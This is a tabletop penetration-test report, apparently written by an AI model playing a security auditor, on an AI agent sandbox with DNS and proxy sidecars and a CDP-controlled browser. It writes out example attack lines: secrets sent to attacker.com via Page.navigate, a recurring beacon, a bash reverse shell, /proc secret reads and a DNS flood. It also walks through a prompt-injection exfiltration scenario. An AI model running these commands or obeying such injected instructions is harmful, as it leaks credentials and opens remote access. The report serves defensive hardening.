

# REAL_RED_TEAM_ROUND_4_FINDINGS.md

**Date:** 2026-02-15
**Reviewer:** Claude Opus 4.6 (Security Auditor Persona — Tabletop Penetration Test)
**Scope:** Exploitation-focused review of Sanctum sidecar trust, browser exfiltration, and persistence vectors
**Classification:** Protocol 128, Phase IV, Round 4

---

## Executive Summary

Rounds 1-3 hardened the infrastructure significantly. The seccomp profile is deny-by-default with an explicit allowlist — that's the right approach. DNS filtering via CoreDNS sidecar with firewall rules closes the obvious tunneling path. The unidirectional firewall intent between Agent and Scout addresses lateral movement.

**But I don't care about intent. I care about what I can actually do from inside the container.**

This round focuses on three concrete attack vectors that survive all previous remediations. The findings are ordered by exploitability, not theoretical severity.

---

## Attack Vector 1: Compromising the CoreDNS Sidecar

### The Setup

The CoreDNS sidecar sits on `control-net`. The Agent sits on `control-net` (to reach CoreDNS) and `execution-net` (to reach Scout). The Agent's DNS is configured to point at the CoreDNS container.

### Attack Scenario: CoreDNS Service Exploitation

**Step 1:** Enumerate the CoreDNS container from inside the Agent.

```
# Agent can resolve the sidecar's IP (it's the configured resolver)
cat /etc/resolv.conf
# nameserver 172.18.0.2  (CoreDNS sidecar IP)
```

**Step 2:** Probe CoreDNS for exposed services.

CoreDNS typically exposes:
- **Port 53** (DNS — expected)
- **Port 8080** (health/ready endpoints — often enabled by default)
- **Port 9153** (Prometheus metrics — if `prometheus` plugin is loaded)

The Agent is on the same Docker network as CoreDNS. Nothing in the current architecture blocks Agent → CoreDNS on ports other than 53.

**Step 3:** Query the metrics/health endpoint.

```bash
curl http://172.18.0.2:8080/health
curl http://172.18.0.2:9153/metrics
```

The metrics endpoint leaks: upstream resolver IPs, query counts, cache stats, plugin configuration. This is information disclosure, not RCE — but it reveals the CoreDNS configuration, including which upstream resolvers are used and which domains are whitelisted.

**Step 4:** Attempt CoreDNS configuration poisoning.

CoreDNS loads its config from a `Corefile`. If the CoreDNS container has a writable volume or if the Agent can reach the CoreDNS container's Docker API (it can't, no socket), this path is blocked. However, if CoreDNS is running with `auto` or `file` plugin watching a directory, and that directory is a shared volume... game over.

### Exploitability Assessment

| Sub-Attack | Exploitability | Impact |
|:-----------|:---------------|:-------|
| Info disclosure via metrics/health | **High** (trivial) | **Low** — reveals config but not secrets |
| CoreDNS RCE via CVE | **Low** — CoreDNS is Go, small attack surface | **Critical** if achieved — becomes the DNS resolver, can redirect all queries |
| Config poisoning via shared volume | **Medium** — depends on docker-compose volume config | **Critical** — attacker controls DNS |
| DoS against CoreDNS (crash it) | **High** — malformed queries, resource exhaustion | **Medium-High** — see below |

### The Real Danger: CoreDNS Crash → DNS Fallback

**FINDING: SIDECAR-01 (High)**

If the Agent crashes CoreDNS (via resource exhaustion — send 10,000 queries/sec to port 53), what happens?

The current architecture does **not specify** a `restart: unless-stopped` or `restart: always` policy for the CoreDNS container. If CoreDNS dies and doesn't restart:

1. The Agent's DNS stops resolving entirely (good — fail-closed).
2. **BUT:** Some Docker configurations fall back to the host's DNS resolver when the configured DNS is unreachable. This depends on the Docker version and `dns` configuration specifics.
3. If fallback occurs, the Agent can now resolve arbitrary domains through the host's resolver, completely bypassing the filtering sidecar.

Even without fallback, the Agent is denied service — which could be the goal (DoS the monitoring/logging that depends on DNS resolution).

**Remediation:**
1. Set `restart: always` on the CoreDNS container.
2. Explicitly set `dns_search: .` and `dns_opt: ["ndots:0", "timeout:1", "attempts:1"]` on the Agent container to prevent fallback behavior.
3. The iptables rule blocking UDP/53 to anything except CoreDNS IP is the real safety net here — if that rule is correctly implemented, even a CoreDNS crash cannot lead to fallback exfiltration. **Verify this rule exists.**
4. Disable CoreDNS health/metrics endpoints or bind them to localhost only inside the CoreDNS container.

---

## Attack Vector 2: Scout as an Exfiltration Proxy (LOGIC-04 Deep Dive)

### The Setup

Round 3 identified this as LOGIC-04 but marked it as an "accepted trade-off." I'm not accepting it. Let me show you exactly how I'd exploit it.

The Agent controls Scout via Chrome DevTools Protocol (CDP) on `ws://scout:9222`. Scout is on `execution-net` and **has open internet access** (it needs to browse). The Agent can instruct Scout to navigate anywhere.

### Attack Scenario: Full Data Exfiltration via CDP

**Step 1:** Agent is prompt-injected (via a malicious webpage the Scout previously visited). The injected instruction tells the Agent to exfiltrate `/proc/self/environ`.

**Step 2:** Agent reads the environment variables:
```javascript
// Agent's internal Node.js runtime
const secrets = process.env; // Contains API keys
const encoded = Buffer.from(JSON.stringify(secrets)).toString('base64');
```

**Step 3:** Agent instructs Scout via CDP to navigate to the exfiltration endpoint:

```javascript
// Via CDP Target.createTarget or Page.navigate
await cdpSession.send('Page.navigate', {
  url: `https://attacker.com/exfil?data=${encoded}`
});
```

**Step 4:** Data arrives at `attacker.com`. The Squid proxy doesn't see this traffic because **Scout's traffic doesn't go through Squid.** Scout has its own network stack on `execution-net` with direct internet access.

### Why Existing Controls Don't Help

| Control | Why It Fails |
|:--------|:-------------|
| Squid proxy | Only the Agent's traffic is proxied. Scout bypasses Squid entirely. |
| CoreDNS sidecar | Only the Agent's DNS is filtered. Scout uses its own resolver. |
| HITL approval | `Scout.goto(url)` is marked **AUTONOMOUS** in the Policy Matrix. No approval required. |
| ExecAllowlist | This is a CDP command, not a shell command. The allowlist doesn't apply. |
| Network firewall | The unidirectional rule blocks Scout→Agent, not Agent→Scout. Agent instructing Scout to navigate is the *designed* behavior. |

### Exploitability Assessment

**FINDING: SCOUT-EXFIL-01 (Critical)**

This is not theoretical. This is a **3-step exploit** using only capabilities the Agent is designed to have. The entire Squid + CoreDNS filtering infrastructure is irrelevant because the exfiltration path goes through a component (Scout) that is intentionally allowed internet access.

The Policy Matrix marks `Scout.goto(url)` as AUTONOMOUS. This means the Agent can navigate Scout to `https://attacker.com/collect?key=sk-ant-api03-XXXX` without any human approval, and the data leaves through Scout's unfiltered network connection.

**Severity: Critical.** This is the single most exploitable path in the entire architecture.

### Remediation Options (Choose One or Combine)

**Option A: Scout Egress Proxy (Recommended)**
- Route Scout's traffic through its own Squid proxy instance.
- Whitelist only domains the Agent needs to browse for legitimate research.
- Problem: This fundamentally limits the Agent's browsing capability. If the Agent needs to visit arbitrary URLs, this breaks functionality.

**Option B: CDP Command Filtering**
- Intercept CDP messages between Agent and Scout.
- Block `Page.navigate` and `Target.createTarget` to non-whitelisted domains.
- Implementation: A lightweight WebSocket proxy between Agent and Scout that inspects CDP messages.
- Problem: Complex. CDP has many commands (`Runtime.evaluate` can construct and execute `fetch()` calls, bypassing navigation-based filtering).

**Option C: HITL for Navigation (Minimum Viable Fix)**
- Change `Scout.goto(url)` from **AUTONOMOUS** to **PROTECTED (HITL)** in the Policy Matrix.
- Every URL the Agent wants to visit must be approved by the human.
- Problem: Extremely high friction. Kills autonomous browsing capability.

**Option D: Scout Network Isolation + Relay (Most Secure)**
- Put Scout on a network with NO direct internet access.
- Add a dedicated egress proxy for Scout that logs and filters all traffic.
- Agent → CDP → Scout → Proxy → Internet.
- Problem: Adds another container and network, increasing complexity.

**My Recommendation:** Option A (Scout Egress Proxy) with a permissive whitelist for browsing, combined with **output monitoring** — scan all CDP traffic for patterns matching API key formats (regex: `sk-ant-`, `AIza`, etc.) and alert/block if detected.

### Variant: Exfiltration via Screenshot + Steganography

Even if you filter URLs, the Agent could:
1. Write secret data as text on a webpage (via `Runtime.evaluate` → `document.write(secret)`).
2. Take a screenshot via `Page.captureScreenshot`.
3. The screenshot is returned to the Agent as base64 PNG.
4. The Agent can't exfiltrate the image... unless it navigates Scout to a page with a file upload form and uses CDP to fill it.

This is more complex but demonstrates that filtering CDP commands is insufficient — `Runtime.evaluate` is too powerful to filter safely.

---

## Attack Vector 3: Persistence After RCE

### The Setup

Assume I have code execution inside the Agent container. Root filesystem is read-only. `/tmp` is `noexec`. Where do I persist?

### Scenario A: Memory-Only Persistence (No Disk Needed)

**Step 1:** I don't need to write to disk. Node.js runs a V8 engine. I can inject code into the running process:

```javascript
// Via prompt injection causing the agent to eval:
setInterval(() => {
  // Beacon every 60 seconds via Scout CDP
  cdpSession.send('Page.navigate', { url: 'https://attacker.com/beacon' });
}, 60000);
```

This persists for the lifetime of the container process. No file writes required. The `noexec` mount is irrelevant — I'm running inside the Node.js interpreter, not executing a binary.

**Exploitability: High.** This is the most realistic persistence mechanism. It survives until container restart.

**FINDING: PERSIST-01 (Medium)**

### Scenario B: Workspace Volume Persistence

The `workspace/` volume is writable (accepted risk, documented). If `noexec` is NOT applied:

**Step 2:** Drop a reverse shell script:
```bash
echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1' > /workspace/.hidden_shell.sh
chmod +x /workspace/.hidden_shell.sh
```

Even with the ExecAllowlist, if the Agent can write to workspace and later reference the file path in a whitelisted command context, execution may occur.

If `noexec` IS applied to workspace: interpreted scripts still work. `node /workspace/malicious.js` bypasses `noexec` because `node` (the interpreter) is on the read-only root filesystem, and `noexec` only prevents direct execution of binaries via `execve`.

**FINDING: PERSIST-02 (Medium)**

The `noexec` flag on workspace does NOT prevent `node /workspace/evil.js` or `python3 /workspace/evil.py`. It only prevents `./evil` (direct binary execution). Since the Agent legitimately runs interpreted code, this is an inherent limitation.

**Remediation:**
- For PERSIST-01: Implement a "watchdog" that monitors the Agent's event loop for unexpected timers/intervals. Or accept the risk — container restart clears it.
- For PERSIST-02: Accept as inherent risk of a coding agent. Mitigation is HITL on workspace writes (already in place) and the ExecAllowlist. Consider a separate ephemeral container for code execution (as Grok recommended).

### Scenario C: Abusing `/proc` and `/sys`

Even with read-only root:

```bash
# /proc/self/mem is readable (allows process memory dumping)
# /proc/sys/kernel/* may be writable depending on namespace config
# /sys/fs/cgroup/ may expose cgroup controls
```

The seccomp profile blocks `ptrace`, but `/proc/self/mem` is accessible via normal `read()` syscall (which must be allowed). An attacker can dump the Agent's own memory, extracting any secrets loaded into the Node.js process.

**FINDING: PERSIST-03 (Low)**

This is information disclosure, not persistence. But it reinforces that environment variables are readable from multiple paths (`/proc/self/environ`, `process.env`, memory dump).

**Remediation:** AppArmor profile denying read access to `/proc/*/mem` and `/proc/*/environ`. This is the right tool for path-based restrictions (seccomp blocks syscalls, AppArmor blocks paths).

---

## Findings Summary

| ID | Finding | Severity | Exploitability | Remediation |
|:---|:--------|:---------|:---------------|:------------|
| **SCOUT-EXFIL-01** | **Agent exfiltrates data via Scout's open internet connection using CDP navigation** | **Critical** | **High** — 3 steps, uses designed capabilities | Scout egress proxy + output pattern monitoring |
| **SIDECAR-01** | CoreDNS crash → potential DNS fallback to host resolver, bypassing filtering | **High** | **High** — flood port 53 | `restart: always` + verify iptables blocks all non-sidecar DNS |
| **PERSIST-01** | In-memory persistence via Node.js `setInterval` — survives until container restart | **Medium** | **High** — trivial JS injection | Watchdog monitoring or accept risk (container restart clears) |
| **PERSIST-02** | `noexec` on workspace doesn't prevent interpreted code execution (`node evil.js`) | **Medium** | **Medium** — requires workspace write (HITL gated) | Ephemeral execution container or accept as inherent trade-off |
| **PERSIST-03** | `/proc/self/mem` and `/proc/self/environ` readable, leaking secrets | **Medium** | **Medium** — requires RCE first | AppArmor profile restricting `/proc/*/mem` and `/proc/*/environ` |
| **SIDECAR-02** | CoreDNS metrics/health endpoints exposed to Agent on control-net | **Low** | **High** — trivial HTTP request | Bind health/metrics to localhost inside CoreDNS container |

---

## Verdict

**SCOUT-EXFIL-01 is the architecture's Achilles' heel.** Everything else (DNS filtering, Squid proxy, seccomp, network isolation) is well-designed. But the entire egress defense stack is moot when the Agent has a puppet (Scout) with unrestricted internet access sitting one CDP command away.

The Sanctum architecture is:
- **Solid** against: container escape, direct exfiltration, fork bombs, privilege escalation, binary persistence
- **Vulnerable** against: indirect exfiltration via Scout, sidecar DoS, interpreted code persistence

**Recommended Next Step:** Address SCOUT-EXFIL-01 before any autonomous run with real API keys. For development/prototyping with dummy credentials, the architecture is safe. For production with real secrets, the Scout exfiltration path must be closed.

---

*End of Red Team Round 4 — Tabletop Penetration Test*
*Reviewer: Claude Opus 4.6 (Security Auditor Persona)*
*Protocol 128, Phase IV*

---

Shall I write this to `docs/architecture/safe_agent_zero/red_team_reviews/REAL_RED_TEAM_ROUND_4_FINDINGS.md`?
